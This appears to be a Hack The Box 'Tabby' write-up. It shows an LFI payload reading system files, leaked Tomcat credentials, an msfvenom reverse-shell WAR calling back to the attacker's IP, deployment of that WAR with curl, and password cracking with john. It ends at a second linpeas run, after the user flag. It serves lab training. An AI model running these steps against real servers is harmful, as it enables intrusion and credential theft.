# Tabby
## Reconnaissance

* Performed TCP and UDP scans using Nmap.
```
sudo nmap -sC -sS -sV -A 10.10.10.194
```
* The results of the Nmap show that TCP port 22, 80, 8080 are open. 

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 00:57 EST
Nmap scan report for 10.10.10.194
Host is up (0.27s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Aggressive OS guesses: Linux 4.15 - 5.6 (94%), Linux 5.0 - 5.3 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (93%), Linux 3.1 (92%), Linux 3.2 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Crestron XPanel control system (90%), Linux 5.0 (90%), Linux 5.0 - 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   273.30 ms 10.10.14.1
2   273.36 ms 10.10.10.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.66 seconds
```

* Web Enumeration

![image](https://raw.githubusercontent.com/kookiecrack/images/main/mega-tabby.png)

```
kali@kali:~/HTB/tabby$ gobuster -u http://10.10.10.194:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt d
ir -x txt,php,asp,aspx -t 40                                                                                      
===============================================================                                                   
Gobuster v3.0.1                                                                                                   
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                   
===============================================================                                                   
[+] Url:            http://10.10.10.194:8080                                                                      
[+] Threads:        40                                                                                            
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt                                             
[+] Status codes:   200,204,301,302,307,401,403                                                                   
[+] User Agent:     gobuster/3.0.1                                                                                
[+] Extensions:     txt,php,asp,aspx                                                                              
[+] Timeout:        10s                                                                                           
===============================================================                                                   
2020/11/06 01:16:46 Starting gobuster                                                                             
===============================================================     
/docs (Status: 302)                                                                                               
/examples (Status: 302)                                                                                           
/manager (Status: 302)   
===============================================================
2020/11/06 01:29:05 Finished 
===============================================================


kali@kali:~/HTB/tabby$ gobuster -u http://10.10.10.194 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-
2.3-medium.txt -x txt,php,aspx,asp -t 40 dir                                                                      
===============================================================                                                   
Gobuster v3.0.1                                                                                                   
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                   
===============================================================                                                   
[+] Url:            http://10.10.10.194                                                                           
[+] Threads:        40                                                                                            
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt                        
[+] Status codes:   200,204,301,302,307,401,403                                                                   
[+] User Agent:     gobuster/3.0.1                                                                                
[+] Extensions:     asp,txt,php,aspx                                                                              
[+] Timeout:        10s                                                                                           
===============================================================                                                   
2020/11/06 01:14:33 Starting gobuster                                                                             
===============================================================                                                   
/files (Status: 301) 
===============================================================                                                   
2020/11/06 03:13:31 Finished                                                                                      
===============================================================  


```

* Searchsploit for Apache Tomcat exploits

```
kali@kali:~/HTB/tabby$ python 42966.py -u http://10.10.10.194:8080



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 

```


* LFI discovered on for http://10.10.10.194
* Access http://10.10.10.194/news.php?file=../../../../../../etc/passwd
```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

* Perform fuzzing using BurpSuite. Intercept request, use intruder and place a list of default file locations.

```
http://10.10.10.194/news.php?file=../../../../../../etc/issue
Ubuntu 20.04 LTS \n \l 

http://10.10.10.194/news.php?file=../../../../../../etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,ash
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:ash
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:ash
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:ash
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
systemd-timesync:x:104:
crontab:x:105:
messagebus:x:106:
input:x:107:
kvm:x:108:
render:x:109:
syslog:x:110:
tss:x:111:
uuidd:x:112:
tcpdump:x:113:
ssh:x:114:
landscape:x:115:
lxd:x:116:ash
systemd-coredump:x:999:
netdev:x:117:
tomcat:x:997:
mlocate:x:118:
ssl-cert:x:119:
mysql:x:120:
ash:x:1000:

http://10.10.10.194/news.php?file=../../../../../../etc/resolv.conf
# This file is managed by man:systemd-resolved(8). Do not edit.
#
# This is a dynamic resolv.conf file for connecting local clients to the
# internal DNS stub resolver of systemd-resolved. This file lists all
# configured search domains.
#
# Run "resolvectl status" to see details about the uplink DNS servers
# currently in use.
#
# Third party programs must not access this file directly, but only through the
# symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,
# replace this symlink by a static file or a different symlink.
#
# See man:systemd-resolved.service(8) for details about the supported modes of
# operation for /etc/resolv.conf.

nameserver 127.0.0.53
options edns0


http://10.10.10.194/news.php?file=../../../../../../etc/mtab
/dev/sda2 / ext4 rw,relatime 0 0
udev /dev devtmpfs rw,nosuid,noexec,relatime,size=973984k,nr_inodes=243496,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0
tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0
hugetlbfs /dev/hugepages hugetlbfs rw,relatime,pagesize=2M 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /run tmpfs rw,nosuid,nodev,noexec,relatime,size=203524k,mode=755 0 0
tmpfs /run/lock tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
securityfs /sys/kernel/security securityfs rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs ro,nosuid,nodev,noexec,mode=755 0 0
cgroup2 /sys/fs/cgroup/unified cgroup2 rw,nosuid,nodev,noexec,relatime 0 0
cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/blkio cgroup rw,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/memory cgroup rw,nosuid,nodev,noexec,relatime,memory 0 0
cgroup /sys/fs/cgroup/freezer cgroup rw,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/cpuset cgroup rw,nosuid,nodev,noexec,relatime,cpuset,clone_children 0 0
cgroup /sys/fs/cgroup/rdma cgroup rw,nosuid,nodev,noexec,relatime,rdma 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup rw,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/perf_event cgroup rw,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/pids cgroup rw,nosuid,nodev,noexec,relatime,pids 0 0
pstore /sys/fs/pstore pstore rw,nosuid,nodev,noexec,relatime 0 0
none /sys/fs/bpf bpf rw,nosuid,nodev,noexec,relatime,mode=700 0 0
debugfs /sys/kernel/debug debugfs rw,nosuid,nodev,noexec,relatime 0 0
tracefs /sys/kernel/tracing tracefs rw,nosuid,nodev,noexec,relatime 0 0
fusectl /sys/fs/fuse/connections fusectl rw,nosuid,nodev,noexec,relatime 0 0
configfs /sys/kernel/config configfs rw,nosuid,nodev,noexec,relatime 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
systemd-1 /proc/sys/fs/binfmt_misc autofs rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=16295 0 0
/dev/loop0 /snap/core18/1705 squashfs ro,nodev,relatime 0 0
/dev/loop1 /snap/snapd/7264 squashfs ro,nodev,relatime 0 0
/dev/loop2 /snap/lxd/14804 squashfs ro,nodev,relatime 0 0
/dev/sda2 /tmp ext4 rw,relatime 0 0
/dev/sda2 /var/tmp ext4 rw,relatime 0 0
tmpfs /run/snapd/ns tmpfs rw,nosuid,nodev,noexec,relatime,size=203524k,mode=755 0 0
tmpfs /var/snap/lxd/common/ns tmpfs rw,relatime,size=1024k,mode=700 0 0
binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc rw,nosuid,nodev,noexec,relatime 0 0
```
* After blindly fuzzing and even installing tomcat 9 to determine the location, I finally found this [page](https://packages.debian.org/sid/all/tomcat9/filelist) which provided info on the default location for Tomcat 9 on debian system. :X

```
/usr/share/tomcat9/etc/tomcat-users.xml
```
![image](https://raw.githubusercontent.com/kookiecrack/images/main/tomcat-pw-tabby.png)

* Successfully obtained the credentials to tomcat. user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script". Logged in to tomcat host-manager
* Tried the same credentials for SSH

```
kali@kali:~/HTB/tabby$ ssh root@10.10.10.194
The authenticity of host '10.10.10.194 (10.10.10.194)' can't be established.
ECDSA key fingerprint is SHA256:fMuIFpNbN9YiPCAj+b/iV5XPt9gNRdvR5x/Iro2HrKo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.194' (ECDSA) to the list of known hosts.
root@10.10.10.194: Permission denied (publickey).
kali@kali:~/HTB/tabby$ ssh tomcat@10.10.10.194
tomcat@10.10.10.194: Permission denied (publickey).
```
## Weaponization
* Create war file using msfvenom for upload to tomcat
```
kali@kali:~/HTB/tabby$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f war -o reverse443.warPayload size: 13398 bytes
Final size of war file: 13398 bytes
Saved as: reverse443.war
```
## Delivery & Exploitation
* Deploy A New Application Archive (WAR) [Remotely](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
*  Curl Commands: -u, --user <user:password> Server user and password,-T, --upload-file <file> Transfer local FILE to destination
* Need to upload via curl because we do not have manager-gui role and only manager-script role.

```
kali@kali:~/HTB/tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T reverse443.war 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse443'
OK - Deployed application at context path [/reverse443]
kali@kali:~/HTB/tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:4:/usr/share/tomcat9-admin/host-manager
/reverse443:running:0:reverse443
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
kali@kali:~/HTB/tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/reverse443
```
* Webshell obtained
```
kali@kali:~/HTB/tabby$ sudo nc -nvlp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.194] 55380
whoami
tomcat
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.194  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:d7:53  txqueuelen 1000  (Ethernet)
        RX packets 780  bytes 179064 (179.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 541  bytes 520732 (520.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 9944  bytes 706488 (706.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9944  bytes 706488 (706.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/sh")'
$ pwd
pwd
/var/lib/tomcat9
$ cd /
cd /
$ cd home
cd home
$ ls -la ash
ls -la ash
ls: cannot open directory 'ash': Permission denied
```
## Privilege Escalation

* Test for password re-use
```
$ su ash
su ash
Password: $3cureP4s5w0rd123!

su: Authentication failure
$ su root
su root
Password: $3cureP4s5w0rd123!

su: Authentication failure

```

* Transfer linpeas to check for PE

```
[+] Operative system                                                                                              
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                   
Linux version 5.4.0-31-generic (buildd@lgw01-amd64-059) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #35-Ubuntu SM
P Thu May 7 20:20:34 UTC 2020                                                                                     
Distributor ID: Ubuntu                                                                                            
Description:    Ubuntu 20.04 LTS                                                                                  
Release:        20.04                                                                                             
Codename:       focal      
                                                                                                                  
[+] Looking for ssl/ssh files                                                                                     
PermitRootLogin yes
PubkeyAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication no
  --> Some certificates were found:
/var/lib/fwupd/pki/client.pem
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/usr/lib/crda/pubkeys/benh@debian.org.key.pub.pem

 --> /etc/hosts.allow file found, read the rules:



Looking inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes 

                                                                                                                  
[+] SGID                                                                                                          
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands              
/snap/core18/1705/sbin/pam_extrausers_chkpwd                                                                      
/snap/core18/1705/sbin/unix_chkpwd                                                                                
/snap/core18/1705/usr/bin/chage                                                                                   
/snap/core18/1705/usr/bin/expiry                                                                                  
/snap/core18/1705/usr/bin/ssh-agent                                                                               
/snap/core18/1705/usr/bin/wall                                                                                    
/usr/bin/chage                                                                                                    
/usr/bin/at             --->    RTru64_UNIX_4.0g(CVE-2002-1614)                                                   
/usr/bin/ssh-agent                                                                                                
/usr/bin/wall                                                                                                     
/usr/bin/expiry                                                                                                   
/usr/bin/mlocate                                                                                                  
/usr/bin/crontab                                                                                                  
/usr/bin/bsd-write                                                                                                
/usr/sbin/unix_chkpwd                                                                                             
/usr/sbin/pam_extrausers_chkpwd                                                                                   
/usr/lib/x86_64-linux-gnu/utempter/utempter                                                                       
                                                                                                                  
[+] Writable folders configured in /etc/ld.so.conf.d/                                                             
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d                                  
/usr/local/lib                                                                                                    
/usr/local/lib/x86_64-linux-gnu                                                                                   
/lib/x86_64-linux-gnu                                                                                             
/usr/lib/x86_64-linux-gnu                                           
                                                                                                                  
[+] .sh files in path                                                                                             
/usr/bin/rescan-scsi-bus.sh                                                                                       
/usr/bin/gettext.sh                                                                                               
                                                                                                                  
[+] Unexpected folders in root                                                                                    
/cdrom         
                                                                                                                  
[+] Looking for others files in folders owned by me                                                               
                                                                                                                  
[+] Readable files belonging to root and readable by me but not world readable                                    
-rw-r----- 1 root tomcat 5435 Feb 24  2020 /etc/tomcat9/policy.d/04webapps.policy                                 
-rw-r----- 1 root tomcat 2192 Feb 24  2020 /etc/tomcat9/policy.d/01system.policy                                  
-rw-r----- 1 root tomcat 2040 Feb 24  2020 /etc/tomcat9/policy.d/50local.policy                                   
-rw-r----- 1 root tomcat 3237 Feb 24  2020 /etc/tomcat9/policy.d/03catalina.policy                                
-rw-r----- 1 root tomcat 330 Feb 24  2020 /etc/tomcat9/policy.d/02debian.policy                                   
-rw-r----- 1 root tomcat 7630 May 21 21:32 /etc/tomcat9/server.xml                                                
-rw-r----- 1 root tomcat 7262 Feb  5  2020 /etc/tomcat9/catalina.properties                                       
-rw-r----- 1 root tomcat 2799 Feb 24  2020 /etc/tomcat9/logging.properties                                        
-rw-r----- 1 root tomcat 2325 Jun 16 12:12 /etc/tomcat9/tomcat-users.xml                                          
-rw-r----- 1 root tomcat 1400 Feb  5  2020 /etc/tomcat9/context.xml                                               
-rw-r----- 1 root tomcat 1149 Feb  5  2020 /etc/tomcat9/jaspic-providers.xml                                      
-rw-r----- 1 root tomcat 172362 Feb  5  2020 /etc/tomcat9/web.xml                                                 
                                                                                                                  
[+] Modified interesting files in the last 5mins                                                                  
/var/log/kern.log                                                                                                 
/var/log/auth.log                                                                                                 
/var/log/journal/c72a21e67341466eacf74373cf80aca6/system.journal                                                  
/var/log/syslog                                                                                                   
/tmp/hsperfdata_tomcat/972                                                                                        
                                                                                                                  
[+] Writable log files (logrotten)                                                                                
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                            
Writable: /var/log/tomcat9/localhost.2020-11-08.log                                                               
Writable: /var/log/tomcat9/catalina.2020-11-08.log   

+] Backup files?                                        
-rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip
-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
```

* Used netcat to transfer the /var/www/html/files/16162020_backup.zip to local machine and crack the password.
```
kali@kali:~/HTB/tabby$ zip2john 16162020_backup.zip > ziphash
16162020_backup.zip/var/www/html/assets/ is not encrypted!                                    
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, dec
mplen=766, crc=282B6DE2
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decm
plen=14793, crc=285CC4D6
ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmp
len=2894, crc=2F9F45F
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmpl
en=123, crc=5C67F19E
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decm
plen=1574, crc=32DB9CE3
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.


kali@kali:~/HTB/tabby$ john ziphash -w=/home/kali/Tools/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:03 DONE (2020-11-08 11:15) 0.3246g/s 3363Kp/s 3363Kc/s 3363KC/s adnc153..adilizinha
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
* Tested password with ash user. Successful
```
$ su ash 
su ash 
Password: admin@it

ash@tabby:/tmp$ cd /home/ash 
cd /home/ash
ash@tabby:~$ cat user.txt
cat user.txt
c1078b3d1b7c96fe4394817cc528e4f8
```
* Run linpeas again using ash user.
```
[+] Unmounted file-system?
[i] Check if you can mount umounted devices
/dev/disk/by-uuid/0aadaa55-9138-4c0d-b1dc-fe8a382110f0 / ext4 defaults 0 0
/swap.img       none    swap    sw      0       0


====================================( Available Software )====================================
[+] Useful software
/usr/bin/nc
/usr/bin/netcat
/usr/bin/wget
/usr/bin/curl
/usr/bin/ping
/usr/bin/base64
/usr/bin/python3
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

[+] Installed Compiler
/snap/core18/1705/usr/share/gcc-8
/usr/share/gcc-10
/usr/share/bash-completion/completions/gcc-5
/usr/share/bash-completion/completions/gcc-6
/usr/share/bash-completion/completions/gcc-7
/usr/share/bash-completion/completions/gcc-8


[+] Readable files belonging to root and readable by me but not world readable                                    
-rw-r----- 1 root adm 10769 Jun 17 16:03 /var/log/apache2/access.log.1                                            
-rw-r----- 1 root adm 869 Nov  8 14:45 /var/log/apache2/error.log.1                                               
-rw-r----- 1 root adm 824 Nov  8 14:45 /var/log/apache2/access.log                                                
-rw-r----- 1 root adm 0 May 21 10:31 /var/log/apache2/other_vhosts_access.log                                     
-rw-r----- 1 root adm 936 Jun 20 20:59 /var/log/apache2/error.log.2.gz                                            
-rw-r----- 1 root adm 239 Nov  8 14:45 /var/log/apache2/error.log                                                 
-rw-r----- 1 root adm 2423 Jun 16 16:42 /var/log/apache2/access.log.2.gz                                          
-rw-r----- 1 root adm 1521 Jun 16 21:26 /var/log/apache2/error.log.3.gz                                           
-rw-r----- 1 root adm 581 Jun 17 16:22 /var/log/apt/term.log.1.gz                                                 
-rw-r----- 1 root adm 0 Nov  8 14:45 /var/log/apt/term.log                                                        
-rw-r----- 1 root adm 10619 May 21 13:16 /var/log/apt/term.log.2.gz                                               
                                                                                                                  
[+] Modified interesting files in the last 5mins                                                                  
/var/log/auth.log                                                                                                 
/var/log/journal/c72a21e67341466eacf74373cf80aca6/user-1000.journal                                               
/var/log/journal/c72a21e67341466eacf74373cf80aca6/system.journal                                                  
/var/log/syslog                                                                                                   
/home/ash/.gnupg/trustdb.gpg                                                                                      
/home/ash/.gnupg/pubring.kbx                                                                                      
```
